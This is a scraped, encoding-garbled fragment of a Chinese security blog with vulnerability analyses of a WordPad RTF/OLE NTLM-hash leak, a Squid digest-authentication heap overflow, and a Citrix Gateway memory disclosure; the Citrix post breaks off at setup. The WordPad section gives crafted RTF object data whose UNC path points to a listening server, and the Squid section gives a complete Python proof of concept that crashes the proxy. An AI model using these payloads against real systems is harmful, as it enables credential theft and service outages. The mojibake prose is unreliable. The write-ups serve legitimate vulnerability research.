¹æ®æ–‡æ¡£å¯çŸ¥è¯¥oleå¯¹è±¡ç±»å‹ä¸ºEmbedObject\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052 fff{\\object\\objemb{\\*\\objclass PBrush}\\objw2835\\objh2835{\\*\\objdata 01050000 02000000 07000000 50427275736800 00000000 00000000 a0a30100 424d8ea30100000000003600000028000000bd000000bd000000010018000000000058a3010000 000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ä¸‹è½½\role toolsï¼ŒæŸ¥çœ‹wordpadç”Ÿæˆçš„rtfæ–‡ä»¶ä¿¡æ¯\nâœ rtfobj.exe .\\test.rtf rtfobj 0.60.1 on Python 3.9.6 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== File: \u0026#39;.\\\\test.rtf\u0026#39; - size: 661865 bytes ---+----------+--------------------------------------------------------------- id |index |OLE Object ---+----------+--------------------------------------------------------------- 0 |00000118h |format_id: 2 (Embedded) | |class name: b\u0026#39;PBrush\u0026#39; | |data size: 107424 | |MD5 = \u0026#39;6eb1e875d3759af5e4b65cd324182471\u0026#39; ---+----------+--------------------------------------------------------------- æˆ‘ä»¬çŸ¥é“Topicå±æ€§æ˜¯è§¦å‘æ¼æ´çš„å…³é”®ï¼Œé€šè¿‡æŸ¥çœ‹oleæ–‡æ¡£æ‰¾åˆ°äº†å…³é”®ä¿¡æ¯ï¼Œå¦‚æœLinkedObjectåŒ…å«äº†ObjectHeaderç»“æ„ï¼Œåˆ™TopicNameå¿…é¡»åŒ…å«æŒ‡å‘é“¾æ¥çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™ä¸ªè·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„æˆ–è€…æ˜¯UNCè·¯å¾„ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†UNCè·¯å¾„è®¾ç½®ä¸ºæˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨ï¼Œé‡æ–°æ„é€ rtfæ–‡ä»¶ï¼ŒæˆåŠŸè§¦å‘\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}{\\*\\mmathPr\\mdispDef1\\mwrapIndent1440 }\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052{\\object\\objemb{\\*\\objclass Word.Document.8}\\objw585\\objh795{\\*\\objdata 01050000 01000000 10000000 576f72642e446f63756d656e742e3800 17000000 5c5c3139322e3136382e35322e3135365c312e72746600 00000000 00000000 00000000 00000000 01050000 05000000 10000000 576f72642e446f63756d656e742e3800 0e000000 74400000 0100090000033a20000009001610000000001610000026060f002220574d464301000000000001 æ³¨æ„åˆ°å³ä½¿è®¾ç½®äº†MotWï¼Œè™½ç„¶wordpadä¼šæ˜¾ç¤ºè­¦å‘Šï¼Œä½†ä»ç„¶ä¼šè®¿é—®TopicæŒ‡å‘çš„èµ„æºï¼Œåœ¨procmonitorä¸­å¯ä»¥çœ‹åˆ°å¦‚ä¸‹äº‹ä»¶ è¡¥ä¸å’Œç¼“è§£æªæ–½åˆ†æ\nå¾®è½¯åœ¨è¡¥ä¸æ—¥åå‘å¸ƒäº†\rä¸€ç¯‡æ–‡ç« ï¼ŒæŒ‡å‡ºå¯ä»¥åœ¨ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole\\AppCompat\\OLELinkConversionFromOLESTREAMToIStorageä¸­æ·»åŠ DWORDçš„Disabledå€¼0x00000001æ¥ç¦ç”¨ï¼Œä½†æˆ‘åœ¨win 10 21h2 9æœˆè¡¥ä¸ä¸­åº”ç”¨äº†æ­¤æ–¹æ³•ï¼Œä½†ä¸èµ·ä½œç”¨ï¼Œwordpadæ²¡æœ‰è¯»å–è¿™ä¸ªæ³¨å†Œè¡¨ã€‚æ‰“å¼€æ–‡ä»¶åä»ç„¶è®¿é—®äº†UNCè·¯å¾„ï¼Œæ³„éœ²äº†NTLM hash\nåœ¨å‰æ–‡è¡¥ä¸åˆ†æä¸­å·²çŸ¥ï¼Œwordpadä¼šä¼ é€’å›è°ƒå‡½æ•°ç»™ole32ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œåœ¨ole32ä¸­ï¼Œä¼šå…ˆæ£€æŸ¥æ³¨å†Œè¡¨æ˜¯å¦ç¦ç”¨äº†oleå¯¹è±¡é“¾æ¥è½¬æ¢ï¼Œè€Œåæ£€æŸ¥å½“å‰è¿›ç¨‹æ˜¯å¦åœ¨ç™½åå•å†…ï¼Œæœ€åè€Œåè°ƒç”¨ç”¨æˆ·æä¾›çš„å›è°ƒå‡½æ•°ï¼Œä»¥è¿è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„è§„åˆ™ã€‚\nPoCæ„é€ \næ‰“å¼€wordpadï¼Œæ’å…¥ä¸€ä¸ªrtfå¯¹è±¡ï¼Œè€Œåå°†Topicçš„é•¿åº¦å’Œnameå­—æ®µæ›¿æ¢ä¸ºUNCè·¯å¾„å³å¯ï¼Œç¨æ™šä¿©å¤©pocä¼šå…¬å¸ƒåœ¨æˆ‘çš„GitHub\nhttps://github.com/Chestnuts4/POC å°ç»“ è¿™ä¸ªæ¼æ´å’Œé¢„æƒ³ä¸­ä¸€æ ·ï¼Œæ˜¯ç”±äºæŸä¸ªå±æ€§å¯ä»¥è¢«è®¾ç½®ä¸ºUNCè·¯å¾„ï¼Œè€Œåwordpadä¼šè®¿é—®è¿™ä¸ªUNCè·¯å¾„ï¼Œè™½ç„¶æ–‡ä»¶è®¾ç½®äº†MotWæ ‡è¯†ï¼Œwordpadæ˜¾ç¤ºäº†è­¦å‘Šï¼Œä½†åå¸¸çš„æ˜¯wordpadä»ç„¶åœ¨ç”¨æˆ·æ²¡æœ‰åŒæ„çš„æƒ…å†µä¸‹è®¿é—®äº†ç›®æ ‡UNCè·¯å¾„ï¼Œè¿™ä¸€ç‚¹æ¯”è¾ƒåç›´è§‰ã€‚\nå‚è€ƒé“¾æ¥\nhttps://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/\nhttps://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/\nCreated at 2023-10-31T17:12:19+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/","title":"Squid Dos","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ å¼€å¯äº†digestèº«ä»½è®¤è¯çš„squidä»£ç†æœåŠ¡å™¨å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€ æˆæ‹’ç»æœåŠ¡ã€‚\næŒ‡çº¹ hunter\nweb.title=\u0026#34;ERROR The requested URL could not be retrieved\u0026#34; å½±å“ç‰ˆæœ¬ squid\n3.2.0.1-5.9, 6.0-6.3 ç¯å¢ƒæ­å»º æŒ‰ç…§configureè„šæœ¬çš„æç¤ºå®‰è£…å„ä¸ªä¾èµ–ï¼Œè€Œåæ‰§è¡Œå¦‚ä¸‹ï¼š\nexport C_INCLUDE_PATH=/usr/include/libxml2 export CPLUS_INCLUDE_PATH=/usr/include/libxml2 ./configure \u0026#39;--build=x86_64-linux-gnu\u0026#39; \u0026#39;--prefix=/root/squid/squid-6.3/build\u0026#39; \u0026#39;--includedir=${prefix}/include\u0026#39; \u0026#39;--mandir=${prefix}/share/man\u0026#39; \u0026#39;--infodir=${prefix}/share/info\u0026#39; \u0026#39;--sysconfdir=/etc\u0026#39; \u0026#39;--localstatedir=/var\u0026#39; \u0026#39;--disable-option-checking\u0026#39; \u0026#39;--disable-silent-rules\u0026#39; \u0026#39;--libdir=${prefix}/lib/x86_64-linux-gnu\u0026#39; \u0026#39;--runstatedir=/run\u0026#39; \u0026#39;--disable-maintainer-mode\u0026#39; \u0026#39;--disable-dependency-tracking\u0026#39; \u0026#39;BUILDCXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations -Wdate-time -D_FORTIFY_SOURCE=2 -Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;BUILDCXX=g++\u0026#39; \u0026#39;--with-build-environment=default\u0026#39; \u0026#39;--enable-build-info=Debian linux\u0026#39; \u0026#39;--datadir=/usr/share/squid\u0026#39; \u0026#39;--sysconfdir=/etc/squid\u0026#39; \u0026#39;--libexecdir=/usr/lib/squid\u0026#39; \u0026#39;--mandir=/usr/share/man\u0026#39; \u0026#39;--enable-inline\u0026#39; \u0026#39;--disable-arch-native\u0026#39; \u0026#39;--enable-async-io=8\u0026#39; \u0026#39;--enable-storeio=ufs,aufs,diskd,rock\u0026#39; \u0026#39;--enable-removal-policies=lru,heap\u0026#39; \u0026#39;--enable-delay-pools\u0026#39; \u0026#39;--enable-icap-client\u0026#39; \u0026#39;--enable-follow-x-forwarded-for\u0026#39; \u0026#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,PAM,POP3,RADIUS,SASL,SMB\u0026#39; \u0026#39;--enable-auth-digest=file,LDAP\u0026#39; \u0026#39;--enable-auth-negotiate=wrapper\u0026#39; \u0026#39;--enable-auth-ntlm=fake,SMB_LM\u0026#39; \u0026#39;--enable-external-acl-helpers=file_userip,LDAP_group,SQL_session,unix_group,wbinfo_group\u0026#39; \u0026#39;--enable-security-cert-validators=fake\u0026#39; \u0026#39;--enable-storeid-rewrite-helpers=file\u0026#39; \u0026#39;--enable-url-rewrite-helpers=fake\u0026#39; \u0026#39;--enable-eui\u0026#39; \u0026#39;--enable-esi\u0026#39; \u0026#39;--enable-zph-qos\u0026#39; \u0026#39;--disable-translation\u0026#39; \u0026#39;--with-swapdir=/var/spool/squid\u0026#39; \u0026#39;--with-logdir=/var/log/squid\u0026#39; \u0026#39;--with-pidfile=/run/squid.pid\u0026#39; \u0026#39;--with-filedescriptors=65536\u0026#39; \u0026#39;--with-large-files\u0026#39; \u0026#39;--with-default-user=proxy\u0026#39; \u0026#39;--enable-linux-netfilter\u0026#39; \u0026#39;--without-systemd\u0026#39; \u0026#39;--with-gnutls\u0026#39; \u0026#39;build_alias=x86_64-linux-gnu\u0026#39; \u0026#39;CFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;LDFLAGS=-Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2\u0026#39; \u0026#39;CXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;--disable-optimizations\u0026#39; é…ç½®åœ¨squid.confæ·»åŠ å¦‚ä¸‹\nauth_param digest program /usr/lib/squid/digest_file_auth -c /etc/squid/password.digest auth_param digest realm localhost acl authenticated proxy_auth REQUIRED http_access allow authenticated http_port 3128 test:localhost:39df1982ed1fef9f74ecd670a2a93c66 ä½¿ç”¨å¦‚ä¸‹è¯·æ±‚è§¦å‘\ncurl -i -k http://116.62.202.230 -x 192.168.59.197:3128 -U test:123456 --proxy-digest æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸åˆ†æ\nè¡¥ä¸ä¿®å¤äºsrc\\auth\\digest\\Config.ccï¼Œå¯ä»¥çœ‹å‡ºè¡¥ä¸ä¸»è¦æ˜¯å¯¹value.sizeè¿›è¡Œäº†åˆ¤æ–­ï¼Œåœ¨ä¿®å¤å‰è™½ç„¶åˆ¤æ–­äº†value.size()æ˜¯å¦ä¸º8ï¼Œä½†ä»…ä»…æ‰“å°äº†ä¸€æ¡è°ƒè¯•ä¿¡æ¯ï¼Œåé¢ä»ç„¶è°ƒç”¨xstrncpyè¿›è¡Œå¤åˆ¶ã€‚ åœ¨è¡¥ä¸å¤„å¦‚æœncå‚æ•°ä¸æ˜¯8åˆ™ä¸ä¼šè°ƒç”¨xstrncpyè¿›è¡Œå¤åˆ¶ã€‚ è€Œxstrncpyè¦å†™å…¥çš„é•¿åº¦å‚æ•°æ¥æºäºvalue.size()ï¼Œvalueæ˜¯ä¸€ä¸ªStringç±»å‹å˜é‡\ncase DIGEST_NC: if (value.size() != 8) { debugs(29, 9, \u0026#34;Invalid nc \u0026#39;\u0026#34; \u0026lt;\u0026lt; value \u0026lt;\u0026lt; \u0026#34;\u0026#39; in \u0026#39;\u0026#34; \u0026lt;\u0026lt; temp \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); } xstrncpy(digest_request-\u0026gt;nc, value.rawBuf(), value.size() + 1); debugs(29, 9, \u0026#34;Found noncecount \u0026#39;\u0026#34; \u0026lt;\u0026lt; digest_request-\u0026gt;nc \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); break; char * xstrncpy(char *dst, const char *src, size_t n) { char *r = dst; if (!n || !dst) return dst; if (src) while (--n != 0 \u0026amp;\u0026amp; *src != \u0026#39;\\0\u0026#39;) { *dst = *src; ++dst; ++src; } *dst = \u0026#39;\\0\u0026#39;; return r; } å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªè¶Šç•Œå†™æ¼æ´ï¼Œå¯ä»¥é€ æˆå †æº¢å‡ºã€‚ åŠ¨æ€è°ƒè¯•\næ–­ç‚¹å¦‚ä¸‹\ngefâ¤ b Auth::Digest::Config::decode gefâ¤ b Config.cc:829 é€šè¿‡curlè§¦å‘æ–­ç‚¹\ncurl -i -k http://host -x 192.168.59.197:3128 -U test:123456 --proxy-digest æ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹\ngefâ¤ bt #0 Auth::Digest::Config::decode (this=0x55a2e598a470, proxy_auth=0x55a2e5cc50e7 \u0026#34;username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, request=0x55a2e61210e0, aRequestRealm=0x0) at Config.cc:830 #1 0x000055a2e483a895 in Auth::SchemeConfig::CreateAuthUser ( proxy_auth=0x55a2e5cc50e0 \u0026#34;Digest username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, al=...) at SchemeConfig.cc:55 #2 0x000055a2e4840d94 in Auth::UserRequest::authenticate (auth_user_request=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:354 #3 0x000055a2e4841952 in Auth::UserRequest::tryToAuthenticateAndSetAuthUser (aUR=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:453 #4 0x000055a2e4807766 in AuthenticateAcl (ch=0x55a2e611ec88) at Acl.cc:57 #5 0x000055a2e4809a2d in ACLProxyAuth::match (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at AclProxyAuth.cc:55 #6 0x000055a2e4861813 in ACL::matches (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at Acl.cc:171 #7 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598bc50, pos=0x55a2e598ac40, child=0x55a2e598ac40) at Checklist.cc:93 #8 0x000055a2e4866018 in Acl::AndNode::doMatch (this=0x55a2e598bc50, checklist=0x55a2e611ec88, start=0x55a2e598ac40) at BoolOps.cc:76 #9 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at InnerNode.cc:91 #10 0x000055a2e4861813 in ACL::matches (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at Acl.cc:171 #11 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598c098, pos=0x55a2e598bc50, child=0x55a2e598bc50) at Checklist.cc:93 #12 0x000055a2e4866198 in Acl::OrNode::doMatch (this=0x55a2e598c098, checklist=0x55a2e611ec88, start=0x55a2e598bc50) at BoolOps.cc:114 #13 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598c098, checklist=0x55a2e611ec88) at InnerNode.cc:91 #14 0x000055a2e4861813 in ACL::matches (this=0x55a2e598c098, checklist=0x55a2e611ec88) at Acl.cc:171 #15 0x000055a2e4867883 in ACLChecklist::matchAndFinish (this=0x55a2e611ec88) at Checklist.cc:295 #16 0x000055a2e4867691 in ACLChecklist::nonBlockingCheck (this=0x55a2e611ec88, callback_=0x55a2e4749b13 \u0026lt;clientAccessCheckDoneWrapper(Acl::Answer, void*)\u0026gt;, callback_data_=0x55a2e611e8b8) at Checklist.cc:254 #17 0x000055a2e47498dc in ClientRequestContext::clientAccessCheck (this=0x55a2e611e8b8) at client_side_request.cc:660 #18 0x000055a2e474da2d in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1704 #19 0x000055a2e4748ec8 in ClientRequestContext::hostHeaderVerify (this=0x55a2e611e8b8) at client_side_request.cc:608 #20 0x000055a2e474d8ff in ClientHttpRequest::doCallouts (this=0x55a2e6119ce8) at client_side_request.cc:1697 #21 0x000055a2e4727ff3 in clientProcessRequest (conn=0x55a2e6118e78, hp=..., context=0x55a2e611a740) at client_side.cc:1759 #22 0x000055a2e48b338e in Http::One::Server::processParsedRequest (this=0x55a2e6118e78, context=...) at Http1Server.cc:284 #23 0x000055a2e4729260 in ConnStateData::clientParseRequests (this=0x55a2e6118e78) at client_side.cc:1948 #24 0x000055a2e472961a in ConnStateData::afterClientRead (this=0x55a2e6118e78) at client_side.cc:1982 #25 0x000055a2e48b701c in Server::doClientRead (this=0x55a2e6118e78, io=...) at Server.cc:183 #26 0x000055a2e48b8250 in CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt;::doDial (this=0x55a2e6117458) at ../../src/CommCalls.h:190 #27 0x000055a2e48b832b in JobDialer\u0026lt;Server\u0026gt;::dial (this=0x55a2e6117458, call=...) at ../../src/base/AsyncJobCalls.h:175 #28 0x000055a2e48b8137 in AsyncCallT\u0026lt;CommCbMemFunT\u0026lt;Server, CommIoCbParams\u0026gt; \u0026gt;::fire (this=0x55a2e6117420) at ../../src/base/AsyncCall.h:147 #29 0x000055a2e48d2d3c in AsyncCall::make (this=0x55a2e6117420) at AsyncCall.cc:44 #30 0x000055a2e48d3e50 in AsyncCallQueue::fire (this=0x55a2e5ca15d0) at AsyncCallQueue.cc:27 #31 0x000055a2e4669475 in EventLoop::dispatchCalls (this=0x7ffd91608f90) at EventLoop.cc:144 #32 0x000055a2e4669381 in EventLoop::runOnce (this=0x7ffd91608f90) at EventLoop.cc:121 #33 0x000055a2e46691d4 in EventLoop::run (this=0x7ffd91608f90) at EventLoop.cc:83 #34 0x000055a2e47a0842 in SquidMain (argc=0x3, argv=0x7ffd916091a8) at main.cc:1661 #35 0x000055a2e479fa03 in SquidMainSafe (argc=0x3, argv=0x7ffd916091a8) at main.cc:1353 #36 0x000055a2e479f9bd in main (argc=0x3, argv=0x7ffd916091a8) at main.cc:1341 åœ¨gdbä¸­å¯ä»¥çœ‹åˆ°valueå€¼ä¸ºä¼ å…¥çš„è¯·æ±‚çš„ncçš„å€¼\ngefâ¤ p value $1 = { static npos = 0xffffffffffffffff, size_ = 0x28, len_ = 0x8, static SizeMax_ = 0xffff, buf_ = 0x55a2e6125a60 \u0026#34;00000001\u0026#34; } é•¿åº¦ä¸ºncçš„é•¿åº¦ï¼Œæ­¤æ—¶åªéœ€è¦ncé•¿åº¦è¶…è¿‡ç›®æ ‡ç¼“å†²åŒº digest_request-\u0026gt;ncå³å¯é€ æˆå †æº¢å‡ºã€‚æŸ¥çœ‹ digest_requestå®šä¹‰å¯çŸ¥ncå¤§å°ä¸º9\nclass UserRequest : public Auth::UserRequest { MEMPROXY_CLASS(Auth::Digest::UserRequest); public: UserRequest(); ~UserRequest() override; int authenticated() const override; void authenticate(HttpRequest * request, ConnStateData * conn, Http::HdrType type) override; Direction module_direction() override; void addAuthenticationInfoHeader(HttpReply * rep, int accel) override; #if WAITING_FOR_TE virtual void addAuthenticationInfoTrailer(HttpReply * rep, int accel); #endif void startHelperLookup(HttpRequest *request, AccessLogEntry::Pointer \u0026amp;al, AUTHCB *, void *) override; const char *credentialsStr() override; char *noncehex; /* \u0026#34;dcd98b7102dd2f0e8b11d0f600bfb0c093\u0026#34; */ char *cnonce; /* \u0026#34;0a4f113b\u0026#34; */ char *realm; /* = \u0026#34;testrealm@host.com\u0026#34; */ char *pszPass; /* = \u0026#34;Circle Of Life\u0026#34; */ char *algorithm; /* = \u0026#34;md5\u0026#34; */ char nc[9]; /* = \u0026#34;00000001\u0026#34; */ char *pszMethod; /* = \u0026#34;GET\u0026#34; */ char *qop; /* = \u0026#34;auth\u0026#34; */ char *uri; /* = \u0026#34;/dir/index.html\u0026#34; */ char *response; digest_requestä¸ºAuth::Digest::UserRequestæŒ‡é’ˆï¼Œä½¿ç”¨newåˆ†é…å†…å­˜ï¼Œä½äºå †å†…\nPoCæ„é€ \næ¼æ´ä»£ç å¯¹åº”äºå¤„ç†[[../06 Protocol/HTTP digestèº«ä»½è®¤è¯|HTTP digest è®¤è¯]]ï¼Œé€šè¿‡è¯¥è®¤è¯è¯·æ±‚éœ€è¦å‘é€ä¸¤æ¬¡è¯·æ±‚ï¼Œç¬¬ä¸€æ¬¡ä¸æºå¸¦è®¤è¯å¤´ï¼Œæ­¤æ—¶squidä¼šè¿”å›407ï¼Œéœ€è¦æå–å“åº”ä¸­çš„nonceï¼Œç®€å•çš„ä½¿ç”¨pythonå³å¯æ„é€  PoC\nimport requests from requests.auth import HTTPDigestAuth import random import string import hashlib proxies={ \u0026#39;http\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39;, \u0026#39;https\u0026#39;:\u0026#39;http://192.168.59.197:3128\u0026#39; } resp_407=\u0026#34;\u0026#34;\u0026#34; Digest realm=\u0026#34;localhost\u0026#34;, nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;, qop=\u0026#34;auth\u0026#34;, stale=false\u0026#34;\u0026#34;\u0026#34; rr=\u0026#39;\u0026#39;\u0026#39;Digest username=\u0026#34;test\u0026#34;,realm=\u0026#34;localhost\u0026#34;,nonce=\u0026#34;47e5f5dc8b7237cf1153065afe358c89\u0026#34;,uri=\u0026#34;/\u0026#34;,cnonce=\u0026#34;a0824a23a0394203c3023085915fd744\u0026#34;,nc=00000001,response=\u0026#34;b45560b922d64786ef7d6c96c9071dfa\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; data=\u0026#39;\u0026#39;\u0026#39;Digest username=\u0026#34;{username}\u0026#34;,realm=\u0026#34;{realm}\u0026#34;,nonce=\u0026#34;{nonce}\u0026#34;,uri=\u0026#34;{uri}\u0026#34;,cnonce=\u0026#34;{cnonce}\u0026#34;,nc={nc},response=\u0026#34;{response}\u0026#34;,qop=\u0026#34;auth\u0026#34;\u0026#39;\u0026#39;\u0026#39; username=\u0026#34;test\u0026#34; password=\u0026#34;123456\u0026#34; realm=\u0026#34;localhost\u0026#34; nc=\u0026#34;00000001\u0026#34;*100 cnonce = \u0026#39;\u0026#39;.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(32)) ha1 = hashlib.md5((username + \u0026#39;:\u0026#39; + realm + \u0026#39;:\u0026#39; + password).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() ha2= hashlib.md5(\u0026#34;GET:/\u0026#34;.encode(\u0026#34;utf-8\u0026#34;)).hexdigest() resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False) if resp.status_code==407: resp_header = resp.headers nonce = resp_header[\u0026#34;Proxy-Authenticate\u0026#34;].split(\u0026#39;,\u0026#39;)[1].split(\u0026#39;=\u0026#39;)[1].rstrip(\u0026#39;\u0026#34;\u0026#39;).lstrip(\u0026#39;\u0026#34;\u0026#39;) response = hashlib.md5((ha1+\u0026#34;:\u0026#34;+nonce+\u0026#34;:\u0026#34;+nc+\u0026#34;:\u0026#34;+cnonce+\u0026#34;:auth:\u0026#34;+ha2).encode(\u0026#39;utf-8\u0026#39;)).hexdigest() print(\u0026#34;nonce: {}\\tcnonce: {}\\tresponse: {}\u0026#34;.format(nonce,cnonce,response)) rdata = data.format(username=username,realm=realm,nonce=nonce,uri=\u0026#34;/\u0026#34;,cnonce=cnonce,nc=nc,response=response) header = { \u0026#34;Proxy-Authorization\u0026#34;: rdata } print(rdata) resp =requests.get(url=\u0026#34;http://116.62.202.230\u0026#34;,proxies=proxies,verify=False,headers=header) print(resp.status_code,resp.text) å°ç»“ ç”±äºsquidä¸ºå¤šè¿›ç¨‹æ¶æ„ï¼Œåœ¨å­è¿›ç¨‹å› ä¸ºæ¼æ´é€€å‡ºæ—¶ï¼Œçˆ¶è¿›ç¨‹ä¼šé‡æ–°ç”Ÿæˆå­è¿›ç¨‹å¤„ç†ä»£ç†è¯·æ±‚ï¼Œå®é™…åˆ©ç”¨æ¯”è¾ƒé¸¡è‚‹ï¼Œä¹Ÿå°±ä¸éš¾ç†è§£è¯¥æ¼æ´æ²¡æœ‰CVEç¼–å·äº†ã€‚\nå‚è€ƒé“¾æ¥\nhttps://github.com/squid-cache/squid/security/advisories/GHSA-phqj-m8gv-cq4g https://datatracker.ietf.org/doc/html/rfc7616\nCreated at 2023-10-26T10:41:55+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/","title":"CVE 2023 4966 Citrix Gateway Info Disclosure","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Citrixä¸­å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œç”±äºè¶Šç•Œè¯»å–ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è·å–åˆ°å­˜å‚¨åœ¨å†…å­˜çš„å¯†é’¥ã€‚\nè¯¥æ¼æ´åœ¨å…«æœˆä¸‹æ—¬è§‚å¯Ÿåˆ°åœ¨é‡åˆ©ç”¨ã€‚\nå…¶ä»–\nè¿™ä¸ªæ¼æ´åœ¨10.19å°±å·²ç»åˆ†æå®Œäº†ï¼Œå½“æ—¶æ‰«æäº†ä¸€ä¸‹å…¬ç½‘å—å½±å“æœåŠ¡å™¨å‘ç°å½±å“æ¯”è¾ƒå¤§ï¼Œæ‰€ä»¥æ²¡æœ‰å…¬å¼€è¯¦æƒ…ï¼Œåœ¨æ˜¨å¤©å›½å¤–å®‰å…¨ç ”ç©¶å‘˜å…¬å¼€äº†PoCï¼Œæ‰€ä»¥ç°åœ¨æ‰å†™åˆ†ææ–‡ç« ã€‚\næŒ‡çº¹ hunter\nweb.title=\u0026#34;Citrix Gateway\u0026#34; å½±å“ç‰ˆæœ¬ NetScaler ADC and NetScaler Gatewayâ€¯14.1â€¯\u0026lt;â€¯14.1-8.50 NetScaler ADC and NetScaler Gatewayâ€¯13.1â€¯\u0026lt;â€¯13.1-49.15 NetScaler ADC and NetScaler Gatewayâ€¯13.0â€¯\u0026lt; 13.0-92.19 NetScaler ADC 13.1-FIPS \u0026lt; 13.1-37.164 NetScaler ADC 12.1-FIPS \u0026lt; 12.1-55.300 NetScaler ADC 12.1-NDcPP \u0026lt; 12.1-55.300 ç¯å¢ƒæ­å»º å‚ç…§\rCVE-2023-3519 Citrix Gateway RCEæ­å»º\n14.1-4.42 192.168.52.100\n14.1-8.50 